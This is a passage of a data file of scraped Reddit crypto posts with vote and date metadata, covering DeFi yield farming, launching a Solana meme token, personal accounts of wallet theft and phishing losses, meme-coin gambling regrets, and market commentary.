beefy**. &#x200b; # what's beefy? (auto-compounder) instead of staking the lp in the dex, you stake it in beefy. beefy will then automatically swap the reward token and add it to your lp. while taking a little bit of profit for themselves. this way you're saving up on gas fee and avoiding the price volatility of the farm token. since beefy automatically compounds everything, they wrote the interest rate as **apy** instead of apr. [beefy apy in polygon](https://preview.redd.it/x7dqwi6ei3a81.png?width=1121&format=png&auto=webp&s=66508e06cd8937ed5a513c7f0eec0bcf428d4b13) &#x200b; [beefy also give you a breakdown of the apr. vault apr is from the farm token.](https://preview.redd.it/6vte637ri3a81.png?width=236&format=png&auto=webp&s=992f51b1dfc7e6ad0f8e57c7dcc5892c45719dbf) # # what's apy? apr is the interest rate in a year. apy is the interest rate in a year if you compound it regularly. 120% apr means 10% per month. simply divide by 12. 120% apy (daily compounded) comes from 78.93% apr. this means if you farm there in a month without compounding, you only get 6.5%. use this website to convert apy to apr or vice versa [https://www.aprtoapy.com](https://www.aprtoapy.com) in short, apy can be **misleading** if you're not planning to farm long term. # risk of defi **hack** the code can have a loophole for hackers to steal your deposited lp. if you use beefy, it exposes you to 2x the potential hack. so far beefy is fine, but another auto-compounder like grim finance has been hacked. **impermanent loss** this is the most common horror story to spook you out of defi. basically if the price of the 2 tokens you put into lp moves differently (percentage-wise), you get less compared to holding those tokens. most people chose to provide lp on **xxx-usd pair** (xxx is usually the chain token like bnb). at least 1 of the token has a very small chance to go to zero. xxx-usd will surely give you an impermanent loss. but hopefully, the apr covers that. you're also gaining a high-interest rate on your stablecoin. what's not to love? use this to calculate your impermanent loss [https://dailydefi.org/tools/impermanent-loss-calculator/](https://dailydefi.org/tools/impermanent-loss-calculator/) below is the impermanent loss if you are in xxx-usd pool: &#x200b; |price of xxx|impermanent loss| |:-|:-| |/10|42.5%| |/5|25.46%| |/3|13.4%| |/2|5.72%| |/1.5|2.02%| |x1|0| |x1.5|2.02%| |x2|5.72%| |x3|13.4%| |x5|25.46%| |x10|42.5%| this means if xxx is volatile, you could experience more il. high market cap coin like eth and bnb are less prone to volatility. so maybe at most is x2 or /2 which is only 5.72% il. **rugpull** the developer could run away with your assets. you can check [https://rugdoc.io/](https://rugdoc.io/) on whether the dex has a backdoor code that allows the dev to steal your lp. but rugdoc only checks the code. there is still a risk of the dev dumping its farm token to near zero. as long as you're not providing lp with the farm token, your assets are safe. even if the website goes down, the code still exists in the blockchain so you can manually take your lp out. **self mistake** you might transfer your token to the wrong address. you might mistakenly approve a fraudulent smart contract that can drain your wallet you might get scammed by a man claiming to be a hot single girl nearby your area asking for your seed phrase. # managing risk and reward typically, higher apr means higher risk. you need to weigh the upside and downside and decide whether it's worth a try. lp with farm token usually gives the largest apr. **is it worth a try?** maybe... if the apr is large enough like 200% apr and it's coming from a reputable dev, then i will invest a little. keep monitoring the apr. sometimes it drops fast because a lot of people are entering. if you think it's not worth the risk anymore, just pull out. the exception is when the farm token has good use case like jewel. other good example is **tomb**. it's a project that try to peg its price 1:1 with ftm. back in november, the apy for tomb-ftm was like 1,600%. 1,600% for essentially stable pool with small il? hell yeah i aped in. i know full well it's a super risky experimental project, but the upside far outweigh the downside. now the apy has dropped immensely. it's now sitting at 200% apy. is it worth the risk for me? when other ftm pool gives decently high apy, it's hard to stay in there. # ohm fork while diving into defi, you will meet this category called ""ohm fork"". they promised **outrageous apy** like 50,000% or even 1,000,000 %. it's obviously an inflationary token, so ask these questions to yourself: **what's the worst-case scenario?** it goes to zero. **what's the good outcome?** apy makes up for the price going down. maybe still 4-5x your investment. **is it worth a try?** depends on your risk assessment. there's nothing wrong with putting a little bit as long as you're ready for the worst case. if you want to try, i suggest picking one with good developer behind it like wonderland time. i'm not saying that my lp of choice won't go to zero. there's always a chance and you should be ready for that. but it's much smaller chance than these ohm fork. # conclusion there are a lot of opportunities in defi. you can be passive and farm in a trusted place or take more risk for higher reward. yes, it is risky, but it can be managed to minimize its risk. **what's next?** keep on researching. there is always new stuff to learn about defi. one thing you might find interesting is how to utilize a lending platform for leveraged farming. thank you.",560,168,0.99,2022-01-06 11:48:27,web3,defi,[deleted],False,413.09999999999997

[Guide] how to create and launch your own meme token,"i'd like to show you an easy way to create a new (meme) token on the solana blockchain. the whole process takes about 10 minutes. the total cost for the creation is about 1 sol, plus the initial liquidity (1 sol is the bare minimum, preferably 2-3 sol, optimally 10). consider these costs completely gone. this guide is only for showing how quick and easy it is, without any code/progamming, so always be cautious on investing in new and unknown tokens, it doesn't really take much to create one. the token we're going to create is: ekp8daikmvzdbg7e1fyakzjvnzct6qda8s265zvwn1yn **part 0: marketing** in order to be even a little bit successfull, you should have some followers on social media, preferably telegram, so you can tell people about your new coin, or airdrop some to the community, maybe even create a presale. no one will buy your coin without marketing, you will just watch bots removing your initial liquidity. **part 1: creating the token/coin itself** i'm going to use fluxbeam to create the initial tokens: [https://fluxbeam.xyz/app/tools/token\_create\_v1](https://fluxbeam.xyz/app/tools/token_create_v1) connect your wallet, fill in your token's details, and click create. this will cost you 0.01 sol. https://preview.redd.it/vxpgplhsx0cc1.png?width=2014&format=png&auto=webp&s=58c4977af888a8b4be4b15c18c6e7e87f3352c7f congratulations, you now own 10000 new tokens in your wallet. fluxbeam will take you directly to your token's detail page, you can copy your token's **ca** (token address / mint address) from the url, you will need it in the future, write it down somewhere: https://preview.redd.it/vpym8tgtx0cc1.png?width=1267&format=png&auto=webp&s=4466ecf779e69cfcee82be5afcb9425b6b29b1d6 click on **manage** on the top right corner, or open this url, replacing the address at the end with your ca from the previous step: [https://fluxbeam.xyz/app/tools/token\_manager?mint=ekp8daikmvzdbg7e1fyakzjvnzct6qda8s265zvwn1yn](https://fluxbeam.xyz/app/tools/token_manager?mint=ekp8daikmvzdbg7e1fyakzjvnzct6qda8s265zvwn1yn) https://preview.redd.it/59phbwgux0cc1.png?width=2004&format=png&auto=webp&s=0ce3cbe0a72ea16f3b6f60fb8aba206c586ab56b it's highly suggested to disable minting and freezing for your new tokens, so you won't be able to modify/freeze the new coins (this helps people trust your new token). just click the two revoke buttons in this page, each will open up a transaction you need to sign with your wallet. (no fee here). this wil take a few minutes to be visible on the chain, but we can move on to the next step, we can leve fluxbeam for now. **part 1.5: airdrops** it's the perfect time to do some fairdrops/airdrops now, you can simply send the tokens from your wallet like any other coin. https://preview.redd.it/r5kg4vavx0cc1.png?width=519&format=png&auto=webp&s=d9272db29611cef3c0e4d430331ba070c6e152be **part 2: creating the market for the coin, adding liquidity** in order to list the token on solana's most used markets (raydium/jupiter), you need to create a liquidity pool, and add some money to it. first step is creating the market: [https://openbook-tools.dexlab.space/market/create](https://openbook-tools.dexlab.space/market/create) base mint is your token's ca, quote mint is wrapped sol's address: so11111111111111111111111111111111111111112 (market will be example/sol). tickers can be 4 - 4 for now (you can read about these two numbers in the ""view tutorial"" link at the top of the page, but it will be fine for this example). that's all the thing you need here, but in order to only pay about 0.5 sol instead of the 3 sol displayed here, you can edit the advanced options to: * event queue length: 128 * request queue length: 9 * orderbook length: 201 * (leave the platform fee at 0.22) https://preview.redd.it/bxmgmjyvx0cc1.png?width=1343&format=png&auto=webp&s=3d6188cff23094e47cde9392ee9cdef8597bb2ae click **create** when ready, this will cost about 0.5 sol. you will be redirected to the following page after a few seconds: https://preview.redd.it/vknm70twx0cc1.png?width=1319&format=png&auto=webp&s=21043dda22d91979187b12b32a5909d903f3b980 make sure to write down the **market address** of your token, we will need it in the next step. you can close this page, we're going to move to **raydium** ([raydium.io](https://raydium.io/)) now: [https://raydium.io/liquidity/create/](https://raydium.io/liquidity/create/) (pools / create pool) https://preview.redd.it/4xwdceixx0cc1.png?width=509&format=png&auto=webp&s=8b15c9cf5aecb62c41bf25d28f7e265a90f00d85 insert your **market address**, click **confirm**. the next part is about adding the liquidity to the pool, add all your tokens by clicking **max** in the first input, **base token initial liquidity** (or type in about 90% of your tokens if you'd like to keep some for airdrop later). **quote token initial liquidity** will be the liquidity in sol you will add, i'd suggest adding at least 2-3, or ideally 10 - projects with large liquidity are more trustworthy for the community. i'm adding 0.7 sol to demonstrate this. https://preview.redd.it/qfw08f5yx0cc1.png?width=474&format=png&auto=webp&s=59b9bc8a218318a3900635bd58fed96a536eba53 there is a 0.68 sol fee, plus the 0.7 sol i'm adding to the initial liquidity, so this costs **1.43** sol. at this point, the token is available for trading, you can check it on birdeye: [https://birdeye.so/token/ekp8daikmvzdbg7e1fyakzjvnzct6qda8s265zvwn1yn?chain=solana](https://birdeye.so/token/ekp8daikmvzdbg7e1fyakzjvnzct6qda8s265zvwn1yn?chain=solana) you can also watch some bots trying to make a few bucks: https://preview.redd.it/yez05dtyx0cc1.png?width=1044&format=png&auto=webp&s=ea400ed2809c09932bd4f61350b15f46728f5805 these bots will slowly drain your liquidity (0.7 sol in my example) if you don't have any marketing plans. it usually takes about 10-15 minutes before you can trade the coin on raydium too, so be patient. **part 3: burning lp tokens** there is one more step i highly recommend, which is burning the lp tokens, which makes the creator impossible to remove the initial liquidity, so you won't be able to rugpull in the classic sense: * open up [https://sol-incinerator.com/](https://sol-incinerator.com/) , connect your wallet * click on the lp tab * select the raydium lp token * click confirm burns **part 4: marketing / waiting** it takes 10-15 minutes for the token to be tradeable in raydium, it will simply say ""pool not found"" first. just be patient. jupiter will automatically pick the coin up, usually in less than a day. **bonus:** [**rugcheck.xyz**](https://rugcheck.xyz/)**:** you can also check your tokens on rugcheck (and also suggest using it for all the coins you want to invest in): [https://rugcheck.xyz/tokens/ekp8daikmvzdbg7e1fyakzjvnzct6qda8s265zvwn1yn](https://rugcheck.xyz/tokens/ekp8daikmvzdbg7e1fyakzjvnzct6qda8s265zvwn1yn) this will take a while to update, the only remaining issues should be these after about an hour: * high holder concentration: we just created the token, it's only bots trading it * low amount of lp providers: same * low liquidity: i only added 0.7 sol for the tutorial's sake, so it will be low congratulations! you've learned how to create a new token on the solana blockchain - and also watched me burn about 2 sol in the process.",346,481,1.0,2024-01-12 10:04:40,web3,solana,bebaszna,False,410.0

SOL is the new BNB and we are back at the 2020s shitcoin era Today.,just had a huge moment of nostalgia thinking back to 4 years ago and how fast the time has gone. just realized that pancake swap is not cool anymore and new projects are not launching on the binance chain. finally exited my worst investment of cake (25k buy in at 20usd) and swapped it for usdc. solanas new launches have gotten so much attention that major exchanges have literally closed sol withdrawals because there are no liquid sol reserves to withdraw. literally go on binance right now and try withdrawing sol or usdc. hoping that people's deposits are still solid. phantom for example has the option to buy sol with fiat but idk how much liquidity do they have. bitcoin vibing at ath and the etfs rolling in have brought back some dumb money sentiment imo. just go on dextools and see the recent launches. kids nowadays launching tokens that get 120k % pumps. yess!? one hundred and twenty thousand procent upticks. just clicking through the projects feels more disconnecting that it did in 2020 when browsing dxsale. that is the reason why there is so much buy pressure on sol. gotta be honest with you guys the fomo is getting the best of me. i checked out the top 20 projects with the best trustworthiness factor and best looking charts. bought a little bit too much of bobr kurwa ($bobr) coin lol. didn't plan to initially but the swaps kept failing and eventually 2 went through instead of one. to the moon i guess. i know there is not a lot of functionality but imo it has the best meme potential currently. bobrcoin.com if you wanna check it out. are you guys currently in any of those big runners? pepe seems to be the safemoon of this run i guess. went to top 100 crypto by marketcap which is totally insane imo. really interested in reddit's opinion and bobr to the moon or something i guess. what do you think has the bitcoin ath bought back the shitcoin season or is it still early?,458,261,0.93,2024-03-08 14:50:13,web3,solana,randezvousatmoon,False,388.50000000000006

I got hacked and stolen $45K off my wallet,"i’m a video editor/programmer who with another guy online started to develop an editing tool that we were planning on selling. we had already started developing the tool and i knew the guy enough to have some trust in him (nothing beyond online). about 3 weeks ago, he sent me a version of the tool that he wanted me to test and i downloaded it on my computer which had the key to metamask wallet (i know it’s dumb i don’t need to be lectured about it i know). that’s how he managed to get it from there, keep in mind the ""version"" of the tool he made me download didn’t work it had an error when showing up which he said he would fix and send me another one when he does so i didn’t think any of it. a few days passed by and he was starting to ghost me a little bit, but we were still communicating about the tool and i worked on it, until i got on my metamask wallet and saw my balance completely emptied (almost all the money i owned gone). i confronted him about it because i knew it could only be him at that point and he denied everything until he blocked me/deleted his discord account. i tried to look for every way to possibly get my money back but it’s gone and there is really nothing much i can do. i can’t eat, i can’t sleep and i can’t go to school ever since i lost the money. i don’t know what i’m gonna do from there, i’m only 19 that’s a lot of money for me and i was supposed to go to university next year using a large chunk of that money but now all of that is gone. i’m really at a point where i want to give up on life. -throwaway account, i’m truly ashamed of myself edit: i will try to take legal actions but i really don't expect anything, as for the people saying i should have had a hardware wallet, i know. i also saw a lot of people claiming i was rich which is hilarious, i'm an immigrant from senegal to canada my parents are middle class workers (accountant and oceanographer) that struggled to give us good life opportunities so yes $45k is a lot of money. this is a part of the money i've invested being a video editor and held in eth since 2-3 years, i'm not rich. thank you for everyone sending me nice words of support, i needed that. edit 2: i bought a ledger wallet to stock the btc i had on another hot wallet, i’m not making the same mistake again. i want to thank you guys again for the nice/wise words my brothers and sisters, it has helped cope a bit better with my situation although i still feel horrible about the whole thing. as for the eth it’s gone, i don’t think i’ll ever see it again and although i still have a bit of money left, i’ll have to make it all over again but as some of you guys said i’ve done it once i can do it again and better.",355,413,0.83,2024-10-04 03:37:30,web3,ethereum,NayaFooty,False,386.50000000000006

Retail Isn’t Here Yet,mid-thirties male here. i was out with some friends last night. a friend and i who have both been into crypto the last few years were talking about a few different altcoins. a few of our friends overhearing laughed and were surprised we were still into crypto. you could tell they had no clue what we were talking about and that bitcoin is currently at an all time high. we’ve jumped from $60k to $80k btc quickly over the last few days but it is clear that the average retail person is not here yet. i think it will take bitcoin close to or above $100k for a week before retail investors start to pay attention. so far this bull run i believe it’s mostly just been people here from last cycle and paying attention over the last couple of years. we’re still early people! i won’t start to take gains until i get those texts from random people asking me what obscure altcoins they should be buying. enjoy the bull run people. those of us that endured the bear market deserve it!,463,227,0.85,2024-11-10 10:15:05,web3,CryptoCurrency,OwlSuspicious9254,False,377.1

Just lost $800k worth of altcoin?,"hey i’d like some insight and guidance after the emotional rollercoaster i just experienced. i’ve been doing a little research on day trading these shitcoins, felt i had enough knowledge to start with a very small amount of money to get the hang of things. i read a redditors process. using dex to do analysis, the filters he uses, and watching for new coins to hit the market. i had bought $30 of solana on jupiter to play with and started watching. passed through a lot of coins and finally pnud hit the screen. it hit the numbers the redditor looked for, looked like a good meme and had a twitter. i took my $30 solana and put it all into pnud. i watched the chart and about a minute later my pnud was worth $804k. i tried submitting the trade of pnud back to solana but i couldn’t because i didn’t have at least 0.1 solana in my wallet. in my panicked adrenaline rush i just pressed buttons until pnud was fully dumped and now worthless… can anyone explain what just happened? did i fumble the bag terribly? would i have submitted the trade and by the time it completed, would the pnud have been dumped already? would i have even been able to submit that trade? what the hell is this crazy game that i just stumbled upon, did i just fuck up making $800k and does this happen on a daily basis? wtf…",338,379,0.82,2024-11-17 13:56:26,web3,solana,Soggy_Curve_2988,False,362.59999999999997

"I got scammed out of 8.6 Eth (22,000$) so you don't have to","obligatory this didn't happen today, it happened christmas day. tl;dr: i got scammed out of 8.6 ethereum, or about 22,000$ transaction: 0x8b9223289156047cc08dea656bd5d479695bc6c7bc48917253be0bc4e02c1246 \-- it was christmas day, and i was sitting on the porcelain chair regretting my prior eggnog decisions, curiously checking up on a totally unrelated crypto, quantum. in poking around, i came across a medium post with a bunch of high-fives (or claps, or whatever their rating system is) talking about an air-drop for qtum. it referenced a ""tool"" that you could link to your web3 wallet to see what aidrops were currently active that you were eligible for. so i linked up, clicked the button, and up popped a signing request. this should have been first `:sirens:` awooga `:sirens:` moment. now, for those that don't know, a signing request is a request for approval to send a transaction. the kicker in this case though, was that the signing request had no information (exodus, the wallet i use, didn't show any details of the transaction i was being asked to send - destination, quantity, etc). in my ignorance with the advent of web3 standards and lack of knowledge of how things work, i legitimately thought this was normal - that it was asking to reveal my public address (or seomthing). again, the prompt to approve the signing request did not contain anything indicating i was sending currency (no destination address was shown, no value / quantity, etc - nothing). after the third or fourth back to back pop-up, that feeling of dread sank in... and my sins became very painfully clear. i sent all of my ethereum, polygon, bat, and render, unknowingly, to this scammer. because of how crypto works, there is no recourse (not even in taxes - thefts aren't claimable, and unrealized gains aren't either). i reached out to exodus and mostly got canned responses back. there's nothing they can do, obviously (other than fix their fucking app to show critical information that would have prevented this from happening in the first place) hopefully my fuck-up can serve as a reminder to anybody involved in the crypto world to remain vigilant, and always remember that you're your own worst enemy. \-- # technical details the medium post i was reading has been taken down, and the user/ post is flagged for review. `https://medium.com/@solanasharkxx803/qtum-qtum-airdrop-eligibility-step-by-step-guide-84bd69fba6ab` the web3 site it linked to for ""checking for airdrops"" (`dappradar.vip`) has also been taken down. both were up and active on christmas. the link in the tl;dr at the top is the transaction, if you're curious, where i unknowingly and unwillingly sent the entirety of my ethereum holdings. hopefully exodus wallet fixes their own apps' shortcoming... the destination (scam) address is `0x0000c5d73291e9ae226e7fe59ea1e6b68be30000`, which itself is an ethereum app, owned by `0x2915d0f44448ccebbe95ebca9193ceb2e462abbf`. the actual scammed currency gets transparently forwarded to `0x000037bb05b2cef17c6469f4bcdb198826ce0000.` at the time of this writing, this scammer has successfully scammed 60.89 eth (\~159,000$) of which 8.636 eth is mine.",398,282,0.9,2024-01-12 05:18:31,web3,ethereum,plitk,False,360.6

Lost 2 paychecks on meme coins in 2 days. Deleting wallets and returning to reality. ,"first off. i became a gambler after my divorce and custody battle last year to cope. traded stocks for 2 years before that but the emotions took over logical trades… i quit gambling december last year after losing around 10k and recovered slowly but recovered. i make a little over 100k a year and have more than enough to live happily. i got into a huge fight with my girl and “relapsed”… the meme coin craze that’s going on on youtube, x, and telegram got me interested in crypto again. i wanted to have more. i wanted to pay my car off, i wanted to buy nicer clothes, i wanted to be the guy that “did it”. i followed every guide on a telegram bot and photon and pump.fun. i noticed so many videos with 100k or more on youtube guiding me on how to turn 1 solana into x amount. at first i killed it and that’s what got me hooked. lost it all the next day. right now crypto is bearish and with that and the hype around making tons off solana i was hooked. i wanted to get my money back. i’m now down about 4k plus and maxed my credit cards out in a week and i’m trying to explain to my very supportive girlfriend i relapsed and today i’m doing what i never thought i’d do. i’m deleting all my crypto accounts. i’m not saying it can’t be done but if you arnt making 200k-500k or even made a big crypto play when the bull run was happening you shouldn’t have some fun but myself….i don’t have the money to lose. if i could give anyone advice the worst thing you can do is win. when you win you get hooked and you’ll end up losing it all. hopefully this saves someone from losing their home or their marriage or both. you’ll never been the slum dog millionaire you think you’ll be. save your money. invest in long term stocks. do roth iras. do anything than solana meme coin trading. i don’t need pity. i’m not looking to have anyone to feel sorry for me. just please don’t make the mistake i made because now i’m literally on a month long road to recover completely. not to mention the hit my ego and my pride took. gambling can be fun in moderation but when things are happening faster than blackjack or machines it’s like crack. you just want 1 more sol to make that play to get you back. if you’re a real success on investing i’m proud of you and that’s great but for anyone that doesn’t have tons of capital or 100k to lose in a day then please don’t follow the mistakes so many are making. so many telegram groups people sayin they are losing their houses they are losing their wives they are down 40 sol and their response is to buy more to make it back. i have people that love me and plenty of money and i’m fresh in my career with more to gain. thanks for listening and i hope you all have a good day. 🫡🫶🏻 tl:dr lost a shit ton on meme coins due to hype, no one in groups are making anything and still losing…their houses wives and careers. live a good life. wealth is family, friends, career. it’s just not worth it. moderation is key but us degens don’t have that. realize your situation and this is not a get rich quick situation. i know someone will post how much they made or make but eventually it will be lost. just takes 1 rug or scam to lose it all. edit: this is not advice against crypto, this is hopefully a saving grace to someone that can’t stop and maybe help them with my story. i know many have lost way more ect. this is just my way of saying goodbye. needed to get it out somewhere. i know everyone’s not going to agree and i respect you opinion. i have a problem. maybe you don’t. edit 6/24: wow i didn’t think i’d get so many comments tbh 😅 again i appreciate all of you for sharing similar stories and for the kind comments again. i edited the first part of the post to give insight into why it became what it became. i guess this needs to be said….i don’t care really about reddit or karma and this is not a pity story. i’m fine and will recover. this post is just out here to warn anybody in a similar situation what happened to me. take it however you want it but look at the comments! i’m not the only one that feels this way. glad this story is relatable and i hope it helps someone cause people commit s***** over this stuff. to everyone laughing at me i deserve it. i made a mistake. either way i hope everyone has a good life and finds success however they want to define it. ❤️ thanks for all the kind replies. hope everyone is happy at the end of the day regardless.",247,464,0.89,2024-06-23 10:33:20,web3,solana,inagravexx,False,342.7

I found my recovery phrase!!!,"i made a post three months ago, which you can still see on my history, about misplacing my recovery phrase & resetting my cold wallet. i turned the whole apartment upside down to find it, but had no luck. after burrowing beyond the sea of scam dms i received, the well-meaning commenters more or less made clear that my crypto was gone unless i could find my recovery phrase. i really struggled after losing it, and actually ended up in the hospital the next day. i’m in the process of moving, and tried to save myself some money on cleaning fees by doing a big deep clean myself (mandatory as part of my rental agreement). lo and behold, i found the phrase in between the sheets of an old textbook. i have absolutely no idea how it ended up there (i never took it out of the case i stored it in), but it doesn’t matter! i found it! i’ve just restored my wallet & everything’s there!!! i would like to ensure that my dumb ass never ends up in this position again. to those who are wiser and/or more experienced, can you please advise as to the best way of storing/securing my recovery phrases for maximum security? i’m not particularly keen on a password manager or any digital storage. thanks in advance. i’m off for a beer!",418,184,0.93,2024-10-22 16:18:53,web3,CryptoCurrency,throwawaynewbrum,False,333.7

ETH has fees are downright crazy. ,"i’ve been trying to swap about $20 worth of a coin to eth, and i keep getting quoted fees over $15. that’s absolutely insane—how can the fees be almost as much as the transaction itself? eth gas fees are ridiculous. why does it cost so much just to send a few lines of code across the network? it’s hard to justify these kinds of fees for something that’s supposed to make decentralized finance accessible. it feels like the system is designed to benefit only a small group of people while others are stuck paying exorbitant costs. the whole thing is starting to seem more and more like a big ponzi scheme, where the fees just line the pockets of a few, leaving regular users out in the cold. for a system that’s supposed to be revolutionary and efficient, it’s doing the opposite for the average person. why should it be this expensive just to make basic transactions? or am i doing something wrong ? i have tried to do the transactions at different time and and the gas is still super high. what on earth is going on with eth ?",195,483,0.7,2024-10-23 04:10:24,web3,CryptoCurrency,super-start-up,False,317.20000000000005

Made $65k on Solana in less than a month.,"i'm one of those cardano believers. i still am, i've been dca'ing since $1. i wanted to enter the solana ecosystem, but i was so hard stuck at buying ada and eth that i kept waiting for me to hit some arbitrary milestone in eth and ada before buying any sol. missed sol at $10 - $20. when it dipped from $40 to $15, i still didn't buy it like an idiot. it was last month i decided to sell a little portion of my ada for sol. bought about 150sol at $40. that has been one of the best decisions i've made all year. because i bought sol, i became more interested in the ecosystem, and i started to write my first dapp on solana (being a software developer and all). it was a basic transfer token from one wallet to another. along the way, i discovered nfts and was lucky to mint degen apes, bold badgers, aurory, and, solbear. i've made an additional 200+ sol trading these nfts and i still have some rare nfts in my hodl wallet. i could have potentially made at least $160,000. but that's neither here nor there. i just wanted to share because i lost my job last month and had more time to learn solana a lot more than i previously did. i'll continue learning to build on solana and just started learning rust. and this just gave me the resources to stay jobless for while.",395,166,0.94,2021-09-09 16:22:24,web3,solana,kayandrae,False,312.79999999999995

Learning from my mistakes last cycle,"last bull run i had half a bitcoin, watching doge and shib blow up, the fud got to me, and i decided half way thru the bull run to cash out my bitcoin and buy into doge and shib, which promptly took a nose dive a month or two later. that was the worst feeling. letting the fud get to me and clouding my decision to trade my bitcoin. for years i regretted and was haunted by that decision. this bull run. i had renewed hope and a promise i would not let the fud get to me this bull cycle. i started out the year with a big bag of eth, hoping i would redeem myself this cycle. now with eth lagging behind bitcoin, the fud has set in again. i read posts and follow news articles, and as eth drags behind this run, the fud is getting intense again in my mind. i promised myself i would not make the same mistake this bull run. i will hodl my eth bag this run. i should trusted my instincts, instead of doubting it like before. if i lose out this run like i did last run, at least this time it won't be the fud that got to me. i have faith confidence that eth will make its bull run this alt season. here's hope to a good eth bull run this cycle. if you are in the same shoes as me, wondering if eth going to make a bull run this cycle, have faith, don't let the fud cloud your decision. don't make the same mistakes like i did last run. good luck everyone.",336,220,0.91,2024-11-20 03:00:39,web3,CryptoCurrency,CatNDoge42,False,298.70000000000005

2024 top ten portfolio vs. the alongside crypto market index token (amkt) the first top ten crypto experiment was started on 1 january 2018 in an attempt to capture the gains of the entire market, similar to the “lazy” approach of the bogleheads in traditional markets. much has changed over the last 7 years, including the introduction of index products designed to capture the entire crypto market (instead of manually buying coins and tokens [like i do for my experiments](https://toptencryptoindexfund.com/announcing-top-10-2024)). like last year, i’m running a friendly competition between the 2024 top ten portfolio and the alongside crypto market index token (**amkt**). **amkt** is an erc-20 token that represents a cap weighted index of 15 cryptocurrencies (minus stablecoins) backed 1:1 by the underlying assets represented within the index and completely onchain. similar to the boglehead community, a do nothing club has emerged encouraging a long-term “lazy” crypto investing approach. since the index represents approximately 95% of the value within crypto, **amkt** is an excellent proxy for the entire cryptocurrency market – exactly what my top ten portfolios have been trying to recreate from the start. here’s the question i’ll be tracking this year: would i have been better off with $1,000 of **amkt** instead of going through the effort of creating a homemade $1,000 top ten index fund? on 1 january 2024, $1000 was equal to 7.2 **amkt.** ten months into the experiment, here’s the **amkt** snapshot as of 1 november 2024: https://preview.redd.it/20b6tv4iho0e1.png?width=783&format=png&auto=webp&s=5e53b6e2d309ced6db75b380cc90d925748a951d **october performances:** * **the 2024 top ten portfolio:** \+3% * **amkt**: +6% the october monthly victory goes to: **the alongside crypto market index token (amkt)** **overall since january 1st, 2024:** * **the 2024 top ten portfolio:** \+11% * **amkt:** \+41% overall lead: **the alongside crypto market index token (amkt).** for the more visual, here’s the table i’m using to track the friendly top ten vs. **amkt** competition this year: https://preview.redd.it/zl1bflifio0e1.png?width=817&format=png&auto=webp&s=ee369a1f8fec3f267bed4e6e111b43cb183c1a18 #

comparison to s&p 500 i’m also tracking the s&p 500 as part of my experiment to have a comparison point to traditional markets. https://preview.redd.it/x99wr9vmio0e1.png?width=1076&format=png&auto=webp&s=633b5e46912849704f8bd462adf6cdf0c13e7167 the s&p 500 is up +20% so far in 2024, so the initial $1k investment into crypto on new year’s day would be worth $1,201 had it been redirected to the s&p. taking the same invest-$1,000-on-january-1st-of-each-year approach with the s&p 500 that i’ve been documenting through the top ten crypto experiments, the yields are the following: * $1000 investment in s&p 500 on january 1st, 2018 = $2,143 today * $1000 investment in s&p 500 on january 1st, 2019 = $2,286 today * $1000 investment in s&p 500 on january 1st, 2020 = $1,774 today * $1000 investment in s&p 500 on january 1st, 2021 = $1,525 today * $1000 investment in s&p 500 on january 1st, 2022 = $1,202 today * $1000 investment in s&p 500 on january 1st, 2023 = $1,492 today * $1000 investment in s&p 500 on january 1st, 2024 = $1,201 today taken together, the results for a similar approach with the s&p: after seven $1,000 investments into an s&p 500 index fund in january 2018, 2019, 2020, 2021, 2022, 2023, and 2024 my portfolio would be worth $11,624. that is up +66% [since january 2018](https://toptencryptoindexfund.com/tracking-2018-top-ten-month-one/) compared to a +198% gain of the combined top ten crypto experiment portfolios. the visual below shows a comparison on roi between a top ten crypto approach and the s&p as per the rules of the top ten experiments: https://preview.redd.it/gxsewmbwio0e1.png?width=1176&format=png&auto=webp&s=27f6d4120455fa01809aff5f9b1f8b21d746ab3e #

read first before downvoting > >disclaimer - i hold a significant amount of the following cryptocurrencies: btc, eth, sol, ada, algo, atom > >1. lots are complaining about the recent exploit, that was in a smart contract that was using a deprecated function that had unintended side effects if extra logic wasn't implemented. let's compare how wormhole handled this compared to the eth dao hack. in the wormhole hack, they fixed the bug and covered the $250+ million that the hacker stole (with help from other partners, of course). in the dao hack, ethereum changed the state against the blockchain rules, effectively reverting transactions (ok not technically on the blockchain, but if you rollback the state the same result is achieved) which is not how blockchains are supposed to work. both of these exploits resulted in a large amount of eth stolen, the way both of them were handled was very different. > >2. people claim that solana isn't decentralized enough. solana has a nakamoto coefficient of 19, meaning that 19 validators must collude to halt the network (those 19 make up 33% of the network so it isn't enough to achieve consensus but it is enough to break quorum). on the other hand, btc and eth have a nakamoto coefficient of under 5, meaning that fewer than 5 mining pools make up more than 51% of the network hashrate. that means that solana is actually significantly more decentralized based on nakamoto coefficient, and that number is expected to grow with the non-custodial stake pools becoming more popular. furthermore, there are 1.5k validators (for reference, there are around 3k on cardano), so that's not a bad number of validators. > >3. people say that solana is too expensive for running a validator. people who say this have never bought an asic or gpu. $5k-10k for running a validator node on solana, you can pay the same price for building a high-powered mining rig on btc or eth. for the people complaining that you need a large amount of solana to be staked to be profitable as a validator given fees on vote transactions, not only does solana foundation have a delegation program where the foundation's reserves are staked to smaller validators, but also in eth2 you need 32 eth ($128k at the ath around $4000/eth) minimum to stake as a validator. > >4. people complain about token distribution on solana, not hearing the same complaints about how the eth premine + eth2 pos is risky or complaints about satoshi (if he's still around) holding 1 million btc. also, token distribution always gets better over time, solana is still a relatively young network. > >5. network went down in september for \~19 hours and hasn't been down since then. the reason the network went down is that validators were prioritizing high compute operations over consensus, this has now been fixed. there was no off switch, the validators crashed on their own from the overload and cascading effect. there was no on switch either, in fact it took 19 hours because 66% of the validators (by stake) needed to come back online to achieve consensus on the upgrade. despite that, people keep saying network is down like every other week, when it's not. fine, transactions are only running at a few hundred tps (votes not included) instead of a few thousand during these periods of congestion so maybe it's a bit slower and you have to try a few times, but people here will say that the network ""crashed"" when it hasn't. this congestion is a sign of high activity on the chain, and when this happens to other chains (eth and matic), fees increase significantly. solana doesn't currently have a fee market, but the devs are currently working on building one and also tackling this problem of high congestion in a creative way by increasing fees only on the smart contracts causing congestion while allowing the rest of the network to operate with normal fees. furthermore, despite the occasional congestion, solana has smart contracts that actually work most of the time and scale to large numbers of concurrent users (looking at you, cardano, with sundaeswap). > >6. solana's main network is literally called mainnet-beta, and everyone is treating it like there should be exactly zero problems. bitcoin went down back in 2013 when it was still a young network, and it's easy to forget since it's so long ago, but these outages aren't a unique problem for newer chains. > >please try to keep the comments civil and purely fact-based, thanks! also, no network is perfect, they all have their flaws, but it's remember to put things into perspective once in a while. > >edit: the title means don't downvote before reading, not downvote after reading. you can feel free to upvote if you find it valuable.",323,188,0.88,2022-02-03 20:33:15,web3,solana,FunEarnings,False,277.8

